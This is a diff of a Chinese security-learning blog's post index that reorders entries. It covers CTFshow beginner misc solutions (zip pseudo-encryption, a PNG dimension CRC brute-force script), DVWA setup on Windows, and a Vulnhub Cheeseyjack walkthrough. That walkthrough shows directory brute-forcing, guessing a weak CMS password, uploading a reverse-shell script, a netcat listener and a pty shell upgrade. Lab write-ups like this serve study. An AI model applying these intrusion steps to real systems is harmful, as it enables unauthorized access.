@@ -60,6 +60,41 @@
       </tags>
   </entry>
   <entry>
+    <title>CTFshow 萌新区杂项1-11</title>
+    <url>/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/</url>
+    <content><![CDATA[<p>CTFshow刷题合集之萌新杂项~</p>
+<h2 id="萌新区-杂项1"><a href="#萌新区-杂项1" class="headerlink" title="萌新区 杂项1"></a>萌新区 杂项1</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/1.1.png"></p>
+<span id="more"></span>
+<p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/1.2.png"><br>hint直接给答案可还行</p>
+<h2 id="萌新区-杂项2"><a href="#萌新区-杂项2" class="headerlink" title="萌新区 杂项2"></a>萌新区 杂项2</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/2.1.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/2.2.png"><br>没啥好讲的 记事本看也行</p>
+<h2 id="萌新区-杂项3"><a href="#萌新区-杂项3" class="headerlink" title="萌新区 杂项3"></a>萌新区 杂项3</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/3.1.png"><br>信息就那么几个：97 10 01 15<br>银行卡密码6位数 试几次就行了<br>密码为 971015</p>
+<h2 id="萌新区-杂项4"><a href="#萌新区-杂项4" class="headerlink" title="萌新区 杂项4"></a>萌新区 杂项4</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/4.1.png"><br>给的信息够多了 直接生成个字典暴力破解就行</p>
+<h2 id="萌新区-杂项5"><a href="#萌新区-杂项5" class="headerlink" title="萌新区 杂项5"></a>萌新区 杂项5</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/5.1.png"><br>乍一看没什么头脑（这种情况也就刚拿到题目一分钟左右）<br>很快就可以发现大写分布是不规律的 尤其是country的o是个0（数字）<br>我们把大写的字母一个一个挑出来 就会发现是答案<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/5.2.png"><br>flag{ctfshownb} 没什么难度，抖机灵的题</p>
+<h2 id="萌新区-杂项6"><a href="#萌新区-杂项6" class="headerlink" title="萌新区 杂项6"></a>萌新区 杂项6</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.1.png"><br>很明了，考察的是伪加密<br>先查找50 4B 01 02<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.2.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.3.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.4.png"><br>改过之后即可解压成功<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.5.png"><br>PS:50 4B 03 04：这是头文件标记（0x04034b50）</p>
+<p>全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性！<br>第二个数字为奇数时 –&gt;加密<br>第二个数字为偶数时 –&gt;未加密</p>
+<p>伪加密<br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p>
+<p>真加密<br>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p>
+<h2 id="萌新区-杂项7"><a href="#萌新区-杂项7" class="headerlink" title="萌新区 杂项7"></a>萌新区 杂项7</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/7.1.png"><br>感觉是改宽高的题<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/7.2.png"><br>确实是改宽高的题   我觉得这种题过不了正规比赛的审（单纯指图片）<br>找到图片的src，然后进行爆破  src跟在宽高后面<br>怎么知道宽高在哪儿？一个很朴素的办法就是先看图片的属性 然后转十六进制 就酱<br>你不得不承认这是种办法  只不过听了有种想打我的冲突而已23333<br>最最原始且朴素的找宽高的办法哈哈哈哈<br>反正正常做法都清楚 我就不写了<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/7.3.png"><br>然后改一下就行了  细节不展示了<br>最后，贴一下爆破宽高的脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import binascii</span><br><span class="line">import os</span><br><span class="line"> </span><br><span class="line">m = open(&quot;flag.png&quot;,&quot;rb&quot;).read()</span><br><span class="line">k=0</span><br><span class="line">for i in range(5000):</span><br><span class="line">    if k==1:</span><br><span class="line">        break</span><br><span class="line">    for j in range(5000):</span><br><span class="line">        c = m[12:16] + struct.pack(&#x27;&gt;i&#x27;, i) + struct.pack(&#x27;&gt;i&#x27;, j)+m[24:29]</span><br><span class="line">        crc = binascii.crc32(c) &amp; 0xffffffff</span><br><span class="line">        if crc == 0x889c2f07:</span><br><span class="line">            k = 1</span><br><span class="line">            print(hex(i),hex(j))</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<h2 id="萌新区-杂项8"><a href="#萌新区-杂项8" class="headerlink" title="萌新区 杂项8"></a>萌新区 杂项8</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/8.1.png"><br>是这样的，题做出来了 跟杂项7是一样的<br>但是我懒得写笔记了 所以这里应付一下（）<br>就跟杂项7的做法一样，上脚本爆破<br>只需要改一下crc就行了 灰常简单~<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/8.2.png"></p>
+<h2 id="萌新区-杂项9"><a href="#萌新区-杂项9" class="headerlink" title="萌新区 杂项9"></a>萌新区 杂项9</h2><p>爷不会</p>
+<h2 id="萌新区-杂项10"><a href="#萌新区-杂项10" class="headerlink" title="萌新区 杂项10"></a>萌新区 杂项10</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/10.1.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/10.2.png"><br>看不出来所以然 看了眼题目摘了眼镜 有点懵逼<br>猜了一下好像是我好喜欢你<br>做题方法：缩小图片并摘下眼镜  (#^.^#)眼快瞎了嗷</p>
+<h2 id="萌新区-杂项11"><a href="#萌新区-杂项11" class="headerlink" title="萌新区 杂项11"></a>萌新区 杂项11</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.1.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.2.png"><br>上传文件之后点seek 密码为空直接点OK打开后发现是一个二维码<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.3.png"><br>是这样的，我扫了一下，然后出来了大吉大利杯的宣传视频，然后末尾还有个这么个东西……<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.4.png"><br>我……  好吧  我先去找一圈wp<br>大佬用的是QR_Research<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.5.png"><br>接下来来base64解码即可<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.6.png"><br>又是被flag笑到的一天</p>
+<hr>
+<blockquote>
+<p>只要心还透明，就能折射希望。</p>
+</blockquote>
+<hr>
+]]></content>
+      <categories>
+        <category>CTFshow刷题合集</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTFshow-Web入门-信息搜集1-20</title>
     <url>/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/</url>
     <content><![CDATA[<h2 id="信息搜集-Web1"><a href="#信息搜集-Web1" class="headerlink" title="信息搜集 Web1"></a>信息搜集 Web1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：开发注释未及时删除导致源码泄露 </span><br></pre></td></tr></table></figure>
@@ -200,7 +235,7 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.55.134/project_management -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30</span><br></pre></td></tr></table></figure>
 <p><img src="/2021/07/22/Cheesey-Cheeseyjack/12.png"><br>访问一下。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/13.png"><br>在databases.yml发现了点信息。不管有用没有，收集起来再说。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/14.png"><br>试着用enum4linux看看能不能收集到啥【enum4linux是Kali Linux自带的一款信息收集工具】</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux 192.168.55.134</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/22/Cheesey-Cheeseyjack/15.png"><br>收集到了两个用户，很重要！记起来！<br><img src="/2021/07/22/Cheesey-Cheeseyjack/16.png"><br>结合刚才收集到的信息来看1.密码弱口令 2.登录邮箱的格式就是网页Contact me给出的格式 3.邮箱是两个用户名其中的一个<br>经过几番尝试后，成功登入。<br>用户：<a href="mailto:&#99;&#104;&#51;&#x33;&#x73;&#x33;&#109;&#x34;&#110;&#64;&#x63;&#x68;&#101;&#x65;&#x73;&#x65;&#121;&#x6a;&#x61;&#99;&#107;&#46;&#x6c;&#x6f;&#x63;&#x61;&#x6c;">&#99;&#104;&#51;&#x33;&#x73;&#x33;&#109;&#x34;&#110;&#64;&#x63;&#x68;&#101;&#x65;&#x73;&#x65;&#121;&#x6a;&#x61;&#99;&#107;&#46;&#x6c;&#x6f;&#x63;&#x61;&#x6c;</a><br>密码：qdpm      #就是那个CMS的名字，登录界面有显示。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/17.png"><br>登录后发现有一处文件上传，而且毫无限制，那还等什么？直接安排上！！<br><img src="/2021/07/22/Cheesey-Cheeseyjack/18.png"><br>我这里上传的是一个反弹shell脚本。去搜一下都能找到，我就不贴出来了。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/19.png"><br>上传后，kali开启监听端口</p>
+<p><img src="/2021/07/22/Cheesey-Cheeseyjack/15.png"><br>收集到了两个用户，很重要！记起来！<br><img src="/2021/07/22/Cheesey-Cheeseyjack/16.png"><br>结合刚才收集到的信息来看1.密码弱口令 2.登录邮箱的格式就是网页Contact me给出的格式 3.邮箱是两个用户名其中的一个<br>经过几番尝试后，成功登入。<br>用户：<a href="mailto:&#x63;&#104;&#x33;&#x33;&#115;&#x33;&#109;&#52;&#110;&#64;&#x63;&#x68;&#101;&#101;&#115;&#101;&#121;&#106;&#97;&#x63;&#x6b;&#x2e;&#108;&#111;&#x63;&#97;&#108;">&#x63;&#104;&#x33;&#x33;&#115;&#x33;&#109;&#52;&#110;&#64;&#x63;&#x68;&#101;&#101;&#115;&#101;&#121;&#106;&#97;&#x63;&#x6b;&#x2e;&#108;&#111;&#x63;&#97;&#108;</a><br>密码：qdpm      #就是那个CMS的名字，登录界面有显示。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/17.png"><br>登录后发现有一处文件上传，而且毫无限制，那还等什么？直接安排上！！<br><img src="/2021/07/22/Cheesey-Cheeseyjack/18.png"><br>我这里上传的是一个反弹shell脚本。去搜一下都能找到，我就不贴出来了。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/19.png"><br>上传后，kali开启监听端口</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1111</span><br></pre></td></tr></table></figure>
 <p><img src="/2021/07/22/Cheesey-Cheeseyjack/20.png"><br>刚才收集到了uploads文件夹，找到shell.php点击即可。<br>![](21 (2).png)<br><img src="/2021/07/22/Cheesey-Cheeseyjack/21.png"><br>因为自带有python3环境【可以用which python找路径】<br>所以这里还可以打一个反弹shell</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
@@ -222,41 +257,6 @@
       </categories>
       <tags>
         <tag>靶机渗透记录</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTFshow 萌新区杂项1-11</title>
-    <url>/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/</url>
-    <content><![CDATA[<p>CTFshow刷题合集之萌新杂项~</p>
-<h2 id="萌新区-杂项1"><a href="#萌新区-杂项1" class="headerlink" title="萌新区 杂项1"></a>萌新区 杂项1</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/1.1.png"></p>
-<span id="more"></span>
-<p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/1.2.png"><br>hint直接给答案可还行</p>
-<h2 id="萌新区-杂项2"><a href="#萌新区-杂项2" class="headerlink" title="萌新区 杂项2"></a>萌新区 杂项2</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/2.1.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/2.2.png"><br>没啥好讲的 记事本看也行</p>
-<h2 id="萌新区-杂项3"><a href="#萌新区-杂项3" class="headerlink" title="萌新区 杂项3"></a>萌新区 杂项3</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/3.1.png"><br>信息就那么几个：97 10 01 15<br>银行卡密码6位数 试几次就行了<br>密码为 971015</p>
-<h2 id="萌新区-杂项4"><a href="#萌新区-杂项4" class="headerlink" title="萌新区 杂项4"></a>萌新区 杂项4</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/4.1.png"><br>给的信息够多了 直接生成个字典暴力破解就行</p>
-<h2 id="萌新区-杂项5"><a href="#萌新区-杂项5" class="headerlink" title="萌新区 杂项5"></a>萌新区 杂项5</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/5.1.png"><br>乍一看没什么头脑（这种情况也就刚拿到题目一分钟左右）<br>很快就可以发现大写分布是不规律的 尤其是country的o是个0（数字）<br>我们把大写的字母一个一个挑出来 就会发现是答案<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/5.2.png"><br>flag{ctfshownb} 没什么难度，抖机灵的题</p>
-<h2 id="萌新区-杂项6"><a href="#萌新区-杂项6" class="headerlink" title="萌新区 杂项6"></a>萌新区 杂项6</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.1.png"><br>很明了，考察的是伪加密<br>先查找50 4B 01 02<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.2.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.3.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.4.png"><br>改过之后即可解压成功<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.5.png"><br>PS:50 4B 03 04：这是头文件标记（0x04034b50）</p>
-<p>全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性！<br>第二个数字为奇数时 –&gt;加密<br>第二个数字为偶数时 –&gt;未加密</p>
-<p>伪加密<br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p>
-<p>真加密<br>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p>
-<h2 id="萌新区-杂项7"><a href="#萌新区-杂项7" class="headerlink" title="萌新区 杂项7"></a>萌新区 杂项7</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/7.1.png"><br>感觉是改宽高的题<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/7.2.png"><br>确实是改宽高的题   我觉得这种题过不了正规比赛的审（单纯指图片）<br>找到图片的src，然后进行爆破  src跟在宽高后面<br>怎么知道宽高在哪儿？一个很朴素的办法就是先看图片的属性 然后转十六进制 就酱<br>你不得不承认这是种办法  只不过听了有种想打我的冲突而已23333<br>最最原始且朴素的找宽高的办法哈哈哈哈<br>反正正常做法都清楚 我就不写了<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/7.3.png"><br>然后改一下就行了  细节不展示了<br>最后，贴一下爆破宽高的脚本：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import binascii</span><br><span class="line">import os</span><br><span class="line"> </span><br><span class="line">m = open(&quot;flag.png&quot;,&quot;rb&quot;).read()</span><br><span class="line">k=0</span><br><span class="line">for i in range(5000):</span><br><span class="line">    if k==1:</span><br><span class="line">        break</span><br><span class="line">    for j in range(5000):</span><br><span class="line">        c = m[12:16] + struct.pack(&#x27;&gt;i&#x27;, i) + struct.pack(&#x27;&gt;i&#x27;, j)+m[24:29]</span><br><span class="line">        crc = binascii.crc32(c) &amp; 0xffffffff</span><br><span class="line">        if crc == 0x889c2f07:</span><br><span class="line">            k = 1</span><br><span class="line">            print(hex(i),hex(j))</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
-
-<h2 id="萌新区-杂项8"><a href="#萌新区-杂项8" class="headerlink" title="萌新区 杂项8"></a>萌新区 杂项8</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/8.1.png"><br>是这样的，题做出来了 跟杂项7是一样的<br>但是我懒得写笔记了 所以这里应付一下（）<br>就跟杂项7的做法一样，上脚本爆破<br>只需要改一下crc就行了 灰常简单~<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/8.2.png"></p>
-<h2 id="萌新区-杂项9"><a href="#萌新区-杂项9" class="headerlink" title="萌新区 杂项9"></a>萌新区 杂项9</h2><p>爷不会</p>
-<h2 id="萌新区-杂项10"><a href="#萌新区-杂项10" class="headerlink" title="萌新区 杂项10"></a>萌新区 杂项10</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/10.1.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/10.2.png"><br>看不出来所以然 看了眼题目摘了眼镜 有点懵逼<br>猜了一下好像是我好喜欢你<br>做题方法：缩小图片并摘下眼镜  (#^.^#)眼快瞎了嗷</p>
-<h2 id="萌新区-杂项11"><a href="#萌新区-杂项11" class="headerlink" title="萌新区 杂项11"></a>萌新区 杂项11</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.1.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.2.png"><br>上传文件之后点seek 密码为空直接点OK打开后发现是一个二维码<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.3.png"><br>是这样的，我扫了一下，然后出来了大吉大利杯的宣传视频，然后末尾还有个这么个东西……<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.4.png"><br>我……  好吧  我先去找一圈wp<br>大佬用的是QR_Research<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.5.png"><br>接下来来base64解码即可<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.6.png"><br>又是被flag笑到的一天</p>
-<hr>
-<blockquote>
-<p>只要心还透明，就能折射希望。</p>
-</blockquote>
-<hr>
-]]></content>
-      <categories>
-        <category>CTFshow刷题合集</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -334,14 +334,25 @@
       </tags>
   </entry>
   <entry>
-    <title>博客更新通知+未来学习计划</title>
-    <url>/2021/08/24/%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%E9%80%9A%E7%9F%A5-%E6%9C%AA%E6%9D%A5%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/</url>
-    <content><![CDATA[<h2 id><a href="#" class="headerlink" title></a></h2><p>最近还是没放下CTF<br>学安全跟CTF到底有没有关系呢？<br>我还是不知道<br>我现在会的东西80%来自打CTF认知的，剩下20%都是靶机里学的<br>还是太菜了……<br>CTF差不多也遇到瓶颈了吧，就会点简单的杂项<br>祥云杯就做出来3个杂项（层层取证+鸣雏恋+考古）<br>还是学学专业知识比较好<br>一直想学学编程 C语言还没怎么动呢<br>接下来还有更多的事要忙呢……</p>
-<h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><p>感觉时间不够用……<br>或者是自己不够努力，三天打鱼两天晒网感动自己吧<br>先把C语言学了，之后自己怎么样也不管了</p>
-<h2 id="-2"><a href="#-2" class="headerlink" title></a></h2><p>加了一个安全团队，以后靶机渗透就不在博客更新了，以后都交给团队了。<br>一边写vulnhub靶机渗透，一边学习域渗透和尝试复现各种漏洞<br>这里就暂时不更新了，反正也没人看吧<br>想学习交流了可以直接联系我</p>
-<h2 id="-3"><a href="#-3" class="headerlink" title></a></h2><p>接下来的计划大概是<br>学基础知识  毫无基础可言，所以开始搞一搞<br>学编程语言  C语言 Python<br>学域渗透 从0开始的学习了属于是</p>
-<h2 id="-4"><a href="#-4" class="headerlink" title></a></h2><p>什么时候才能会挖洞呢……</p>
+    <title>在win10搭建DVWA</title>
+    <url>/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/</url>
+    <content><![CDATA[<h2 id="搭建DVWA漏洞环境"><a href="#搭建DVWA漏洞环境" class="headerlink" title="搭建DVWA漏洞环境"></a>搭建DVWA漏洞环境</h2><p>下载phpstudy或wamp，我用的是phpstudy2018（此处感谢我的一位同学，很早就给我点到这里了，十分感谢！）<br>打开phpstudy，启动Apache和MySQL<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.1.png"></p>
+<span id="more"></span>  
+<p>然后进入phpadmin<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.2.png"><br>phpmyadmin数据库管理工具的用户名和密码默认都为root<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.3.png"><br>点击数据库，创建名为DVWA的数据库<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.4.png"><br>想查看的话可以通过phpstudy打开数据库存所对应的文件夹<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.5.png"><br>下载dvwa的zip包，解压放置到\phpStudy\PHPTutorial\WWW<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.6.png"><br>然后进入\PHPTutorial\WWW\DVWA-master\config  找到文件config.inc.php.dist<br>复制粘贴一份并将其名称改为config.inc.php【将.dist去掉即可】<br>进去修改配置，修改后如下：<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.65.png"><br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.7.png"><br>保存之后打开浏览器，地址栏输入127.0.0.1/DVWA-master/setup.php<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.8.png"><br>在这里需要看看Setup Check中是否有红色字体的Disabled<br>如果有，需要把问题解决才可以Create/reset database<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.9.png"><br>比如我这里就出问题了。PHP function allow_url_include:disabled<br>解决方法：先进入指定目录<br>选择自己版本的文件夹，我这里是php-5.4.45<br>打开后找到php.int并进行修改<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/3.0.png"><br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/3.1.png"><br>修改后如下：<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/3.2.png"><br>修改后在浏览器打开127.0.0.1/DVWA-master/setup.php<br>问题解决了<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/3.3.png"><br>点击Create/reset database会自动跳转到DVWA的登录界面<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/3.4.png"><br>默认用户名：admin  密码：password<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/3.5.png"><br>登录成功，部署成功！</p>
+<hr>
+<p>我真的适合这条路吗？我不知道<br>一直往前走，就适合了吧<br>2021年3月1日，有件事我可能会记很久，我本来在外面散心情。在外面的时候师傅突然问我要不要学东西，我立马跑回来家打开电脑。事后我觉得很震惊，而且心里酸酸的。时不时有人来问我学习视频看到哪里了，或者打ctf，有人问我博客的事，有人跟我分享学习……他们也给了我动力。<br>接下来，还有很长的路要走<br>加油</p>
+<hr>
+<blockquote>
+<p>我希望我希望的有希望</p>
+</blockquote>
+<hr>
 ]]></content>
+      <categories>
+        <category>Web安全学习记录</category>
+      </categories>
+      <tags>
+        <tag>Web安全学习记录</tag>
+      </tags>
   </entry>
   <entry>
     <title>靶机DC-1的渗透记录</title>
@@ -422,6 +433,16 @@
       <tags>
         <tag>靶机渗透记录</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>博客更新通知+未来学习计划</title>
+    <url>/2021/08/24/%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%E9%80%9A%E7%9F%A5-%E6%9C%AA%E6%9D%A5%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/</url>
+    <content><![CDATA[<h2 id><a href="#" class="headerlink" title></a></h2><p>最近还是没放下CTF<br>学安全跟CTF到底有没有关系呢？<br>我还是不知道<br>我现在会的东西80%来自打CTF认知的，剩下20%都是靶机里学的<br>还是太菜了……<br>CTF差不多也遇到瓶颈了吧，就会点简单的杂项<br>祥云杯就做出来3个杂项（层层取证+鸣雏恋+考古）<br>还是学学专业知识比较好<br>一直想学学编程 C语言还没怎么动呢<br>接下来还有更多的事要忙呢……</p>
+<h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><p>感觉时间不够用……<br>或者是自己不够努力，三天打鱼两天晒网感动自己吧<br>先把C语言学了，之后自己怎么样也不管了</p>
+<h2 id="-2"><a href="#-2" class="headerlink" title></a></h2><p>加了一个安全团队，以后靶机渗透就不在博客更新了，以后都交给团队了。<br>一边写vulnhub靶机渗透，一边学习域渗透和尝试复现各种漏洞<br>这里就暂时不更新了，反正也没人看吧<br>想学习交流了可以直接联系我</p>
+<h2 id="-3"><a href="#-3" class="headerlink" title></a></h2><p>接下来的计划大概是<br>学基础知识  毫无基础可言，所以开始搞一搞<br>学编程语言  C语言 Python<br>学域渗透 从0开始的学习了属于是</p>
+<h2 id="-4"><a href="#-4" class="headerlink" title></a></h2><p>什么时候才能会挖洞呢……</p>
+]]></content>
   </entry>
   <entry>
     <title>靶机DC-2的渗透记录</title>
@@ -622,6 +643,11 @@
       </tags>
   </entry>
   <entry>
+    <title>靶机Hemisphere-Gemini渗透记录</title>
+    <url>/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>靶机covfefe: 1渗透记录</title>
